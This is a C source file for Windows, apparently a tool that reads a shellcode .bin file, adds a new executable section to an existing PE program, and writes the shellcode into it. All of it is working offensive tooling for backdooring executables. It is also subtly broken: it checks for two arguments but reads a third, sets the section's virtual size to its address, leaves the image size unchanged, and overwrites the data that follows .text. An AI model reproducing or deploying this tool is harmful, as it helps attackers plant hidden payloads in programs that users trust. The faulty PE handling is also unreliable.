#include <Windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("[!] Usage \"%s\" <PE> <New Section name> <.bin>\n", argv[0]);
        return -1;
    }

	PBYTE pShellcode;
	SIZE_T stShellcode;
	if(!ReadFileFromDisk(argv[3], &pShellcode, &stShellcode)){
		return -1;
	}

    LPCSTR PeName = argv[1];
    HANDLE hPE = CreateFileA(PeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hPE == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileA for PE file failed with error: %lu\n", GetLastError());
        return -1;
    }

    HANDLE hMapFile;
    LPVOID pPE;
    if (!MapView(hPE, PeName,&hMapFile, &pPE, stShellcode)) {
		goto _CLEANUP;
        return -1;
    }

    if (!InsertCustomSection(pPE, argv[2], (PVOID)pShellcode, stShellcode)) {
		goto _CLEANUP;
        return -1;
    }
_CLEANUP:

    UnMapView(hMapFile, pPE);
    CloseHandle(hPE);
    return 0;
}


BOOL MapView(HANDLE hPE, LPCSTR PeName,PHANDLE hMapFile, LPVOID* pImage, SIZE_T SctSize) {
    DWORD PreSize = GetFileSize(hPE, NULL);
	
	printf("[*] Reading, Mapping and change size at \"%s\"...\n", PeName);

	printf("\t[i] Original file sizeof(%s)\n", PeName);
	printf("\t[i] Shellcode sizeof(%d)\n", SctSize);

	DWORD NewSize = PreSize + SctSize;
	printf("\t[*] File sizeof(%s) after increased with shellcode size: %d\n", PeName, NewSize);

    *hMapFile = CreateFileMappingA(hPE, NULL, PAGE_READWRITE, 0, NewSize, NULL);
    if (*hMapFile == NULL) {
        printf("\t[!] CreateFileMapping failed with error: %lu\n", GetLastError());
        return FALSE;
    }
    *pImage = MapViewOfFile(*hMapFile, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
    if (*pImage == NULL) {
        printf("\t[!] MapViewOfFile failed with error: %lu\n", GetLastError());
        CloseHandle(*hMapFile);
        return FALSE;
    }
	printf("\t[*] Mapped memory for PE at 0x%p\n\n", pImage);

    return TRUE;
}

BOOL UnMapView(HANDLE hMapFile, LPVOID pImage) {
    if (!UnmapViewOfFile(pImage)) {
        printf("[!] Error UnMapView: %lu\n", GetLastError());
        return FALSE;
    }

    if (!CloseHandle(hMapFile)) {
        printf("[!] Error CloseHandle: %lu\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL InsertCustomSection(LPVOID pPE, LPCSTR SctName, PVOID SctData, ULONG SctSize) {
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pPE;
    PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)((BYTE*)pPE + pImgDosHdr->e_lfanew);
    PIMAGE_SECTION_HEADER pImgSctHdr = IMAGE_FIRST_SECTION(pImgNtHdr);

	printf("[*] Starting insert new section in PE file...\n");

    printf("\t[i] Number of Sections pre-change: %d\n", pImgNtHdr->FileHeader.NumberOfSections);

    PIMAGE_SECTION_HEADER pTextSection = NULL;
    for (DWORD i = 0; i < pImgNtHdr->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pImgSctHdr[i].Name, ".text") == 0) {
            pTextSection = &pImgSctHdr[i];
            break;
        }
    }
    if (pTextSection == NULL) {
        printf("\t[!] .text section not found\n");
        return FALSE;
    }
    DWORD NewSectionRVA = pTextSection->VirtualAddress + pTextSection->Misc.VirtualSize;
    DWORD NewSectionRawSize = SctSize;
    DWORD NewSectionRawOffset = pTextSection->PointerToRawData + pTextSection->SizeOfRawData;

    pImgSctHdr[pImgNtHdr->FileHeader.NumberOfSections].VirtualAddress = NewSectionRVA;
    pImgSctHdr[pImgNtHdr->FileHeader.NumberOfSections].SizeOfRawData = NewSectionRawSize;
    memcpy(pImgSctHdr[pImgNtHdr->FileHeader.NumberOfSections].Name, SctName, strlen(SctName));
    pImgSctHdr[pImgNtHdr->FileHeader.NumberOfSections].PointerToRawData = NewSectionRawOffset;
    pImgSctHdr[pImgNtHdr->FileHeader.NumberOfSections].Misc.VirtualSize = NewSectionRVA;
    pImgSctHdr[pImgNtHdr->FileHeader.NumberOfSections].Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;

    pImgNtHdr->FileHeader.NumberOfSections++;

	printf("\t[*] Number Of Section pos-change: %d\n", pImgNtHdr->FileHeader.NumberOfSections);

    memcpy((BYTE*)pPE + NewSectionRawOffset, SctData, SctSize);

    printf("\t[*] New section '%s' inserted at RVA: 0x%x, Raw Offset: 0x%x\n\n", SctName, NewSectionRVA, NewSectionRawOffset);

    return TRUE;
}

BOOL ReadFileFromDisk(LPCSTR lpFileName, PBYTE* pFile, SIZE_T* sFile) {

	HANDLE	hFile = INVALID_HANDLE_VALUE;
	PBYTE	pBuff = NULL;
	DWORD	dwFileSize = NULL,
		dwNumberOfBytesRead = NULL;

	printf("[i] Reading \"%s\"...\n", lpFileName);

	hFile = CreateFileA(lpFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("\t[!] CreateFileA for binary file Failed With Error : %d \n", GetLastError());
		goto _CLEANUP;
	}

	printf("\t[*] CreateFile for binary file Successfully\n");

	dwFileSize = GetFileSize(hFile, NULL);
	if (dwFileSize == NULL) {
		printf("\t[!] GetFileSize for binary file Failed With Error : %d \n", GetLastError());
		goto _CLEANUP;
	}

	pBuff = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
	if (pBuff == NULL) {
		printf("\t[!] HeapAlloc for binary file Failed With Error : %d \n", GetLastError());
		goto _CLEANUP;
	}

	printf("\t[*] Allocated buffer of binary file at: 0x%p\n\n", pBuff);

	if (!ReadFile(hFile, pBuff, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("\t[!] ReadFile for binary file Failed With Error : %d \n", GetLastError());
		printf("\t[!] Bytes Read for binary file: %d of : %d \n\n", dwNumberOfBytesRead, dwFileSize);
		goto _CLEANUP;
	}


_CLEANUP:
	*pFile = (PBYTE)pBuff;
	*sFile = (SIZE_T)dwFileSize;
	if (hFile)
		CloseHandle(hFile);
	if (*pFile == NULL || *sFile == NULL)
		return FALSE;
	return TRUE;
}

